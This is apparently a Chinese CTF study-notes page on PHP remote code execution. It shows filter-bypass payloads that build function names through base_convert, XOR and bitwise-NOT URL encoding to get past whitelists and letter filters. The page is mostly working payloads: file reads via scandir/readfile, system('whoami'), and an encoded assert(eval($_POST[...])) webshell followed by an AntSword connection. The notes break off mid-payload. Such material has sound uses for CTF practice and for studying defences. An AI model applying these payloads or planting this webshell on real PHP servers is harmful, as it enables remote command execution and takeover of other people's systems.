class="line"></span><br><span class="line">我们看看这个localeconv()函数是什么东西</span><br><span class="line"></span><br><span class="line">用var_dump(localeconv())后返回的是一个数组，数组的第一个就是.</span><br><span class="line">然后配合current()或pos()函数，选取数组的第一个值</span><br><span class="line">之后配合函数array_flip,array_reverse,array_rand</span><br><span class="line">读取文件函数show_source,file_get_contents,readfile,highlight_file</span><br><span class="line"></span><br><span class="line">所以我们可以构造payload</span><br><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line"></span><br><span class="line">readfile(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">    </span><br><span class="line">getchwd() 函数返回当前工作目录   /home/php </span><br><span class="line">payload=readfile(next(array_reverse(scandir(getcwd())))) <span class="comment">//读 取 倒 数 第 二 个 文 件 。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(<span class="number">47</span>))) 					chr(<span class="number">47</span>)  ==&gt;  /</span><br><span class="line">http:<span class="comment">//node3.buuoj.cn:27406/calc.php?%20num=readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span></span><br><span class="line">											chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)  ==&gt;  /f1agg</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇三十六进制转到奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?c=$_GET[_]($_GET[__]);&amp;_=system&amp;__=ls</span><br><span class="line">过滤_</span><br><span class="line">造_GET</span><br><span class="line">hex2bin也被挡  用base_convert来得到字符串 即不被允许的函数名hex2bin</span><br><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)  从<span class="number">10</span>进制转到<span class="number">36</span>进制   <span class="number">37907361743</span> ==&gt;  hex2bin</span><br><span class="line">    hex2bin(str)  ==&gt;构造  hex2bin(<span class="number">5</span>f474554))=_GET  <span class="number">5</span>f474554  ==&gt; _GET  dechex十进制转十六进制</span><br><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>))   ==&gt; _GET</span><br><span class="line">    </span><br><span class="line">a=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>))</span><br><span class="line">?c=$a=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));$$a[b]($$a[d]);&amp;b=system&amp;d=ls   [ ]被拌了</span><br><span class="line">?c=$a=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));$$a&#123;b&#125;($$a&#123;d&#125;);&amp;b=system&amp;d=ls   tm  a和b不是白名单的函数</span><br><span class="line">?c=$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));$$pi&#123;pi&#125;($$pi&#123;abs&#125;);&amp;pi=system&amp;abs=ls</span><br></pre></td></tr></table></figure>



<h1 id="无字母的RCE"><a href="#无字母的RCE" class="headerlink" title="无字母的RCE"></a>无字母的RCE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'rosé will not do it'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you are so close, omg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#构造代码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r_xor</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">            result=i^j</span><br><span class="line">            print(<span class="string">"  "</span>+chr(i)+<span class="string">" ASCII:"</span>+str(i)+<span class="string">' &lt;--xor--&gt; '</span>+chr(j)+<span class="string">" ASCII:"</span>+str(j)+<span class="string">' == '</span>+chr(result)+<span class="string">" ASCII:"</span>+str(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    r_xor()</span><br></pre></td></tr></table></figure>

<p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__=(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"."</span>^<span class="string">"~"</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"|"</span>^<span class="string">"/"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);                   即$__=_POST</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">  $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">  <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   @<span class="keyword">eval</span>($code);                                                    <span class="keyword">eval</span>(getFlag());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint = "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">方法一 &amp;_</span><br><span class="line">?code=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;_&#125;();&amp;_=phpinfo     %ff%ff%ff%ff^%a0%b8%ba%a ==&gt;   _GET         <span class="keyword">eval</span>(phpinfo();); </span><br><span class="line">?code=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;_&#125;();&amp;_=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)   不行????????  会报错</span><br><span class="line">?code=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">方法二  ;$_();</span><br><span class="line">?code=$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;$_();   还未构造</span><br><span class="line">    </span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>);$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>);$___=$$__;$_($___[_]);  <span class="comment">//assert($_POST[_]) </span></span><br><span class="line">_=phpinfo();        可以</span><br><span class="line">这个payload经测试PHP <span class="number">7.0</span><span class="number">.12</span>及以下版本可以使用，碰到更高的版本可能assert()不能使用了，可以换成<span class="keyword">eval</span>()</span><br></pre></td></tr></table></figure>

<p>我们最终是要读取到那个getFlag函数，我们需要构造一个_GET来去读取这个函数，我们最终构造了如下字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">方法一 &amp;_</span><br><span class="line">?code=$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag            <span class="comment">//getFlag();           "`&#123;&#123;&#123;"^"?&lt;&gt;/" ==&gt; _GET</span></span><br><span class="line">    				   $&#123;_GET&#125;[_]($&#123;_GET&#125;[__])           利用$&#123;&#125;中的代码会被执行的特点  __为空  _=getFlag</span><br><span class="line">    				   $_GET[_]($_GET[]) </span><br><span class="line">    				   getFlag($_GET[])         $_GET[_]为getFlag  $_GET[]为空</span><br><span class="line">    				   getFlag()                                         <span class="keyword">eval</span>(getFlag());</span><br><span class="line"></span><br><span class="line">方法二  ;$_();</span><br><span class="line">?code=$_=<span class="string">'[[]|@[['</span>^<span class="string">'&lt;&gt;):,:&lt;'</span>;$_();  <span class="comment">//getFlag();   '[[]|@[['^'&lt;&gt;):,:&lt;'   ==&gt;  getFlag</span></span><br><span class="line"></span><br><span class="line">方法四  没试过</span><br><span class="line">?code=$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=执行的命令</span><br><span class="line">    				   _GET[_](_GET[__])</span><br><span class="line">        			   assert(执行的命令)</span><br><span class="line">?code=$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">include</span> <span class="string">"/tmp/exploit.php"</span></span><br></pre></td></tr></table></figure>

<h2 id="取反再urlencode绕过-该方法只适用于PHP7"><a href="#取反再urlencode绕过-该方法只适用于PHP7" class="headerlink" title="取反再urlencode绕过   该方法只适用于PHP7"></a>取反再urlencode绕过   该方法只适用于PHP7</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//脚本</span></span><br><span class="line">$a=<span class="string">'phpinfo'</span>;      <span class="comment">//编(eval($_POST[zhiliya]))时必须用单引号包裹 要不然$_POST会被当成是变量解析   括号倒是可以不用加  被双引号括住的内容，将被视为单一字符串，防止通配符的扩展，但允许变量扩展 ，这点与单引号的处理方式不同。</span></span><br><span class="line">$shell=urlencode(~$a);</span><br><span class="line">$info=<span class="string">"(~"</span>.$shell.<span class="string">")"</span>;</span><br><span class="line"><span class="comment">//echo ~urldecode($shell)."\n";</span></span><br><span class="line"><span class="keyword">echo</span> $info;   <span class="comment">//$info就是phpinfo的取反再url编码</span></span><br><span class="line"></span><br><span class="line">$b=<span class="string">"%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>.~urldecode(<span class="string">"%9E%8C%8C%9A%8D%8B"</span>);</span><br><span class="line"><span class="comment">//echo  urlencode(~"phpinfo");  取反 然后再url编码</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">方法一  &amp;_=</span><br><span class="line">code=`~(%A0%B8%BA%AB)[_]()`;&amp;_=phpinfo     不行</span><br><span class="line">code=$&#123;~(%A0%B8%BA%AB)&#125;[_]();&amp;_=phpinfo        php版本限制 要<span class="number">7.0</span>以上      $&#123;~(%A0%B8%BA%AB)&#125;==&gt;  $&#123;_GET&#125;      &amp;_ 需要$_GET</span><br><span class="line">	<span class="keyword">or</span></span><br><span class="line">code=$&#123;~(%A0%B8%BA%AB)&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">方法二 ;$_(); </span><br><span class="line">code=$_=~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>;$_();               <span class="keyword">eval</span>(phpinfo(););</span><br><span class="line"></span><br><span class="line">方法三  ();</span><br><span class="line">code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();    phpinfo();     php版本限制 要<span class="number">7.0</span>以上         <span class="keyword">eval</span>(phpinfo(););</span><br><span class="line">code=(~%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>)((~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>%D7%D6));    <span class="keyword">eval</span>(<span class="keyword">eval</span>(phpinfo());)  两层<span class="keyword">eval</span>就会报错 phpinfo()后面要加分号</span><br><span class="line">code=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)((~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span>));    system(<span class="string">'whoami'</span>);   php版本限制 要<span class="number">7.0</span>以上   <span class="keyword">eval</span>(system(<span class="string">'whoami'</span>););</span><br><span class="line">code=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)((~%<span class="number">93</span>%<span class="number">8</span>C));     system(<span class="string">'ls'</span>);</span><br><span class="line">code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)((~%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">85</span>%<span class="number">97</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">96</span>%<span class="number">86</span>%<span class="number">9</span>E%A2%D6));     assert(<span class="keyword">eval</span>($_POST[zhiliya]));</span><br><span class="line">测试webshell成不成功  post:zhiliya=phpinfo();</span><br><span class="line">然后再上蚁剑</span><br><span class="line">?\S*=$&#123;phpinfo()&#125; </span><br><span class="line">?\S*=$&#123;system(<span class="string">'whoami'</span>);)&#125; </span><br><span class="line">?\S*=$&#123;<span class="keyword">eval</span>($_POST[zhiliya])&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>(phpinfo());</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>(system(<span class="string">'whoami'</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="keyword">eval</span>($_POST[zhiliya]));</span><br><span class="line"><span class="keyword">echo</span> assert(<span class="keyword">eval</span>($_POST[zhiliya]));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getFlag方法一</span><br><span class="line">?code=~(%A0%B8%BA%AB)[_]();&amp;_=getFlag   真不行</span><br><span class="line">看起来简化版</span><br><span class="line">?code=$&#123;~(%A0%B8%BA%AB)&#125;[_]();&amp;_=getFlag ==&gt; $&#123;_GET&#125;[_]();&amp;_=getFlag  ==&gt;  $_GET[_]=getFlag  ==&gt;  getFlag();   <span class="keyword">eval</span>(getFlag(););</span><br><span class="line">?code=$&#123;~<span class="string">"%A0%B8%BA%AB"</span>&#125;[_]();&amp;_=getFlag</span><br><span class="line">看起来加长版</span><br><span class="line">?code=%<span class="number">24</span>%<span class="number">7</span>B%<span class="number">7</span>E%<span class="number">22</span>%A0%B8%BA%AB%<span class="number">22</span>%<span class="number">7</span>D%<span class="number">5</span>B%AA%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;%aa=getFlag</span><br><span class="line">~ 在 &#123;&#125; 中执行了取反操作，所以 $&#123;~<span class="string">"\xa0\xb8\xba\xab"</span>&#125; 取反相当于 $_GET，拼接出了 $_GET[<span class="string">'+'</span>]();，传入 +=getFlag() 从而执行了函数</span><br><span class="line">    </span><br><span class="line">getFlag方法二</span><br><span class="line">?code=$啊=(%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">40</span>%<span class="number">5</span>C%<span class="number">60</span>%<span class="number">40</span>%<span class="number">40</span>%<span class="number">5</span>D%<span class="number">27</span>^%<span class="number">27</span>%<span class="number">3</span>A%<span class="number">25</span>%<span class="number">28</span>%<span class="number">26</span>%<span class="number">2</span>C%<span class="number">21</span>%<span class="number">3</span>A%<span class="number">27</span>);$啊();                      <span class="keyword">eval</span>(getFlag(););</span><br><span class="line">$啊=getFlag;$啊();，这里就不需要用 &#123;&#125; 了，因为取反的值直接被当作字符串赋值给了 $ 啊。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'./'</span>));</span><br><span class="line">%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D <span class="comment">//print_r</span></span><br><span class="line">%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D <span class="comment">//scandir</span></span><br><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)((~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)((<span class="string">"./"</span>)));   print_r(scandir(<span class="string">'./'</span>));   成功   php版本限制 要<span class="number">7.0</span>以上 </span><br><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)((~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)((<span class="string">"/"</span>)));    print_r(scandir(<span class="string">'/'</span>));</span><br><span class="line"></span><br><span class="line">使用 readfile(<span class="string">'/flag'</span>) 和 readfile(<span class="string">'/readflag'</span>) 读取两个文件内容</span><br><span class="line">    highlight_file(<span class="string">'/flag'</span>)</span><br><span class="line">    show_source(<span class="string">'/flag'</span>)</span><br><span class="line">%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">9</span>A  <span class="comment"># readfile</span></span><br><span class="line">%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>   <span class="comment"># /flag</span></span><br><span class="line">%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>   <span class="comment"># /readflag</span></span><br><span class="line">?code=(~%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">9</span>A)((~%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>));   readfile(<span class="string">'/flag'</span>)</span><br><span class="line">?code=(~%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">9</span>A)((~%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>));  readfile(<span class="string">'/readflag'</span>) 读取根目录下的readflag文件 发现是二进制文件，猜测应该是运行这个可执行文件，然后得到flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%<span class="number">8</span>F%<span 